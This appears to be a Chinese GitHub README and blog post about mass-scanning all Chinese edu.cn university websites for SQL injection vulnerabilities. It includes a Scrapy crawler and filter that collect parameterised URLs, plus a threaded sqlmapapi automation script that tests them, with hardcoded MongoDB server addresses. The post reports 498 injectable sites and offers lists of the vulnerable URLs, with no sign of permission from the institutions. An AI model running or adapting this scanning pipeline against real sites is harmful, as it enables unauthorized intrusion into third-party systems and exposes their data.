暑假时候对中国edu_cn进行的一次简单的SQL注入扫描，配合 [此文](https://blog.fiht.me/archives/60/) 食用更有风味. 基本模型已经出来了，剩下还需要一个bash脚本，精力有限，就不总结了，有感兴趣的同学留下issue，我看到了会回复你们
## 关于开放使用
用的这个框架已经比较成熟了，但是对于form和ajax无力，考虑在重构。谢谢各位的关注
因为近期博客整改，所以贴上博文：


---
title: 对全国edu.cn域名的一次SQL注入扫描工作.md
date: 2016-11-22 12:06:59
tags: [SQL注入，扫描器]
categories: 网络空间安全
---
本文所有内容纯属虚构，本人不对此文章的真实性，数据的有效性负责。
<!-- more -->
#  记一次对全网edu.cn的扫描工作

暑假比较闲，于是完成了这一次对整个教育网edu.cn域名的SQL注入的扫描。这篇文档将会介绍我实现这次扫描的整个过程和这次扫描过程中用到的部分工具/代码
## 首先介绍一下成果
1. 本次一共选取了959个edu.cn顶级域名，覆盖了近7w个二级域名。检测的有效URL达到21w条。一共检查出498个含有SQL注入的网站。  
2. 爬虫模块使用3台腾讯云16H16G内存服务器，共耗时3H，花费近150元
3. URL检测部分使用实验室8H16G服务器，耗时约一周

## 工作流程
1. 找到edu.cn的域名
2. 找到上述域名旗下的子域名
3. 使用爬虫模块，找到子域名中包含的URL中带=的URL，并增量爬取（没有加入对form表格和js的处理）
4. 利用sqlmapapi，检测上述URL

## 找到edu.cn的域名
使用脚本：[click_me](#)  
使用此脚本获取到edu域名（有重复的去重，不是重点，暂不解释）
## 找到edu.cn 对应的二级域名
使用脚本：[click_me](#)s

## 爬虫模块
爬虫模块使用的是Scrapy框架，关于Scrapy框架的使用[Scrapy官方网站](https://scrapy.org/)
关键代码：
1. spider.py
```python
#----------------------------------------------------------------------
def __init__(self):
    '''从Mongo里面取出数据，并将正在爬取标志位置为1'''
    db = pymongo.MongoClient('119.29.70.15')['edu_cns']['things']
    things = db.find_one({'scrapyed':{'$exists':False}})
    db.update({'_id':things['_id']},{'$set':{'scrapyed':'1'}})
    self.start_urls =[ 'http://%s'%i for i in things['subDomains']]
    self.allowed_domains = [things['host']]
    print things
    self.host = things['host']
    self._id = things['_id']

def parse(self,response):
    """parse"""
    if not hasattr(response,'xpath'):
        return
    for url in response.xpath('//*[@href]/@href').extract():
        url = response.urljoin(url)  # 转化成绝对路径
        yield scrapy.Request(url)
        if '=' in url and '.css' not in url and 'javascript:' not in url and "tree.TreeTempUrl" not in url and '?' in url: #一个粗略的检查，这里写得很不好，需要重构
            item = UrlInjection()
            item['url'] = url
            item['_id'] = self._id
            yield item

```
2. URL过滤器
从Spider返回等待爬取的链接，到了这里来去除重复
```python
class CustomFilter(RFPDupeFilter):
    def __init__(self,path=None,debug=None):
        RFPDupeFilter.__init__(self,path,debug)
        self.fingerprints = {}

    def __getid(self,url): # 使用Domain 作为key
        '''example：
            input http://www.sdu.edu.cn/path/to/file?key1=1&key2=2
            return www.sdu.edu.cn
        '''
        mm = urlparse(url)[1]
        return mm

    def request_seen(self, request): # 如果不需要继续爬取，则返回True，URL被过滤
        fp = self.__getid(request.url)
        if not self.fingerprints.has_key(fp): # 没有爬取过
            self.fingerprints[fp]=0
            return False
        else:
            if self.fingerprints[fp]<200: # 每个网站最多只爬取200个链接
                self.fingerprints[fp]+=1
                return False
            else:
                return True
~                                   
```

3. pipeline.py
处理从Spider里面返回的Item
```python
class MongoDBPipeline:
    """对爬取到的URL进行去重之后写入数据库"""
    #----------------------------------------------------------------------
    def __init__(self):
        connection = pymongo.MongoClient(
            settings['MONGODB_SERVER'],
            settings['MONGODB_PORT']
        )
        db = connection[settings['MONGODB_DB']]
        self.collection = db[settings['MONGODB_COLLECTION']]
        self.se = set()
    def process_item(self, item, spider):
        valid = True
        url = item['url']
        key = url[:url.find('?')]
        if key not in self.se:
#            self.collection.insert(dict(item))
#            i.update({'host':'hnjd.edu.c3n'},{'$push':{'url':{"$each":[6]}}})
            self.collection.update({'_id':item['_id']},{"$push":{"url":item['url']}})
            self.se.add(key)
        else:
            pass
        return item

```
## 注入点检测模块
使用的是sqlmapapi，代码是当时在Wooyun社区看到的一个模块，保存了原作者信息：
```python
#!/usr/bin/python
# -*- coding:utf-8 -*-

import time
import json
import urllib
import urllib2
#import redis
import sys
import requests
import param
import threading
from Queue import Queue
from pymongo import MongoClient
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
que = Queue()
result_que = Queue()
count = 0
MONGO_SERVER = '211.87.234.98'
MONGO_PORT = 27017
MONGO_DATABASE = 'edu_cnResults'
MONGO_COLLECTION = 'urls'
db = MongoClient(MONGO_SERVER,MONGO_PORT)[MONGO_DATABASE][MONGO_COLLECTION]
mutex = threading.Lock()
result_file = open('/tmp/resulttttt','w+')
class Autoinj(threading.Thread):
    """
    	sqlmapapi 接口建立和管理sqlmap任务
    	by zhangh (zhanghang.org#gmail.com)
      modefied by fiht(fiht#qq.com)
    """

    def __init__(self, server='', target='', method='', data='', cookie='', referer=''):
        threading.Thread.__init__(self)
        self.server = server
        if self.server[-1] != '/':
            self.server = self.server + '/'
        # if method == "GET":
            # self.target = target + '?' + data
        # else:
            # self.target = target
        self.target = ''
        self.taskid = ''
        self.engineid = ''
        self.status = ''
        self.method = method
        self.data = data
        self.referer = referer
        self.cookie = cookie
        self.start_time = time.time()
        #print "server: %s \ttarget:%s \tmethod:%s \tdata:%s \tcookie:%s" % (self.server, self.target, self.method, self.data, self.cookie)
    #----------------------------------------------------------------------
    def get_target(self):
        """从数据库中找target,以后可以加一个用文件找的"""
        mutex.acquire()
        result=db.find_one({'Scaning':{'$exists':False}})
        if result:
            self.target=result['url']
            db.update({'url':result['url']},{'$set':{'Scaning':1}})
            print('正在检测%s'%self.target)
            mutex.release()
            return True
        else:
            print('没法从数据库里面取出数据')
            mutex.release()
            return False
    def task_new(self):
        code = urllib.urlopen(self.server + param.task_new).read()
        self.taskid = json.loads(code)['taskid']
        return True

    def task_delete(self):
        url = self.server + param.task_del
        url = url.replace(param.taskid, self.taskid)
        requests.get(url).json()

    def scan_start(self):
        headers = {'Content-Type':'application/json'}
        url = self.server + param.scan_task_start
        url = url.replace(param.taskid, self.taskid)
        data = {'url':self.target}
        t = requests.post(url, data=json.dumps(data), headers=headers).text
        t = json.loads(t)
        self.engineid = t['engineid']
        return True

    def scan_status(self):
        url = self.server + param.scan_task_status
        url = url.replace(param.taskid, self.taskid)
        self.status = requests.get(url).json()['status']

    def scan_data(self):
        url = self.server + param.scan_task_data
        url = url.replace(param.taskid, self.taskid)
        return requests.get(url).json()

    def option_set(self):
        headers = {'Content-Type':'application/json'}
        url = self.server + param.option_task_set
        url = url.replace(param.taskid, self.taskid)
        data = {}
        if self.method == "POST":
            data["data"] = self.data
        if len(self.cookie)>1:
            data["cookie"] = self.cookie
        #print data
        data['threads'] = 10
        data['smart'] = True
        data['is-dba'] = True
        t = requests.post(url, data=json.dumps(data), headers=headers).text
        t = json.loads(t)

    def option_get(self):
        url = self.server + param.option_task_get
        url = url.replace(param.taskid, self.taskid)
        return requests.get(url).json()

    def scan_stop(self):
        url = self.server + param.scan_task_stop
        url = url.replace(param.taskid, self.taskid)
        return requests.get(url).json()

    def scan_kill(self):
        url = self.server + param.scan_task_kill
        url = url.replace(param.taskid, self.taskid)
        return requests.get(url).json()

    def start_test(self):
        # 开始任务
        #self.target=que.get()
        self.start_time = time.time()
        if not self.task_new():
            print("Error: task created failed.")
            return False
        # 设置扫描参数
        self.option_set()
        # 启动扫描任务
        if not self.scan_start():
            print("Error: scan start failed.")
            return False
        # 等待扫描任务
        while True:
            self.scan_status()
            if self.status == 'running':
                time.sleep(40)
            elif self.status== 'terminated':
                break
            else:
                print "unkown status"
                break
            if time.time() - self.start_time > 3000: #多于五分钟
                error = True
                print('删除一个不怎么带劲的IP:%s'%self.target)
                count += 1
                self.scan_stop()
                self.scan_kill()
                return [self.target,0]

        # 取结果
        res = self.scan_data()
        # 删任务
        self.task_delete()
        global count

        print(res['data'])
        if res['data']:
            count += 1
            print("耗时:" + str(time.time() - self.start_time))
            print('已经检测%d个url'%count)
            return [self.target,res['data'][0]['value'][0]['dbms']]
        else:
            count += 1
            print("耗时:" + str(time.time() - self.start_time))
            print('已经检测%d个url'%count)
            return [self.target,0]

    #----------------------------------------------------------------------
    def run(self):
        """不停地找"""
        while(self.get_target()):
            try:
                result = self.start_test()
                #print('----->',result)
                if result[1]:
                    mutex.acquire()
                    db.update({'url':result[0]},{'$set':{'injection':1,'info':result[1]}})
                    print('找到一个url%s'%self.target)
                    result_file.writelines(self.target+'--->'+str(result[1]))
                    mutex.release()
                else:
                    mutex.acquire()
                    db.update({'url':result[0]},{'$set':{'injection':0}})
                    mutex.release()
            except Exception as e:
                print e
                break
host_list = ['http://localhost:8775/','http://localhost:8776/','http://localhost:8776',
             'http://localhost:8775/',
#             'http://139.129.25.173:8775/',#,'http://139.129.25.173:8775/',
#             'http://123.206.65.93:8775/'
             ]
#----------------------------------------------------------------------
def main():
    threads = [Autoinj(host) for i in range(50) for host in host_list] # 一个client实例一次处理10个注入点
    for thread_ in threads:
        thread_.start()

if __name__=='__main__':
    start_time = time.time()
    # for i in open('/tmp/sss').readlines():
        # #print('http://%s'%i.strip())
        # que.put(i.strip())
    main()
    #host = ['http://localhost:8775/']
    #print('一共花费时间%s,一共找到注入%s'%(time.time()-start_time,result_que.qsize()))
#if Autoinj(server='http://localhost:8775/',target='http://f5eca5159a6076025.jie.sangebaimao.com/mysql/get_str.php?id=1').run()['data']:

```

## 资源分享
**仅适用于科学研究，勿做他用**
[各个高校的域名打包](#)
[21w个url](#)
[含有注入点的URL](#)

再来分享一些有意思的事情：
1. 各高校的子域名统计：
<iframe style="width: 100%; height: 100%" src="http://www.tubiaoxiu.com/p.html?s=bd3cb7edaad1db64"></iframe>
发现山大的主域名最多，达到了900余个
2. 各高校的SQL注入点统计：
<iframe style="width: 100%; height: 100%" src="http://www.tubiaoxiu.com/p.html?s=94fe130e9d6a82e2"></iframe>

3. 存在SQL注入的数据库类型统计：
<iframe style="width: 100%; height: 100%" src="http://www.tubiaoxiu.com/p.html?s=7258f3b0690d082f"></iframe>
